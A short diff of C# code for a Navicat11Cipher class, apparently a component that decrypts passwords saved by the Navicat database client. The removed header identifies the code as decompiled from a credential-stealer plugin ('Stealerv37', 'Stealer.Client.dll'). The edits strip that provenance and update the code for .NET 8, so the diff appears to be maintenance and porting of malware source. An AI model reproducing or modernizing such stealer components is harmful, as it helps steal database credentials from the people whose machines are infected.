@@ -1,10 +1,4 @@
-﻿// Decompiled with JetBrains decompiler
-// Type: Intelix.Helper.Encrypted.Navicat11Cipher
-// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
-// MVID: D491006B-B4AE-4407-B02D-3CC101716992
-// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Security.Cryptography;
@@ -19,7 +13,7 @@ public class Navicat11Cipher
 
   protected byte[] StringToByteArray(string hex)
   {
-    return Enumerable.Range(0, hex.Length).Where<int>((Func<int, bool>) (x => x % 2 == 0)).Select<int, byte>((Func<int, byte>) (x => Convert.ToByte(hex.Substring(x, 2), 16 /*0x10*/))).ToArray<byte>();
+    return Enumerable.Range(0, hex.Length).Where<int>((Func<int, bool>) (x => x % 2 == 0)).Select<int, byte>((Func<int, byte>) (x => Convert.ToByte(hex.Substring(x, 2), 16))).ToArray<byte>();
   }
 
   protected void XorBytes(byte[] a, byte[] b, int len)
@@ -41,6 +35,8 @@ public class Navicat11Cipher
       (byte) 51,
       (byte) 57
     };
+    
+    // Modernized SHA1 Creation for .NET 8
     using (SHA1 sha1 = SHA1.Create())
     {
       byte[] hash = sha1.ComputeHash(inputBuffer);
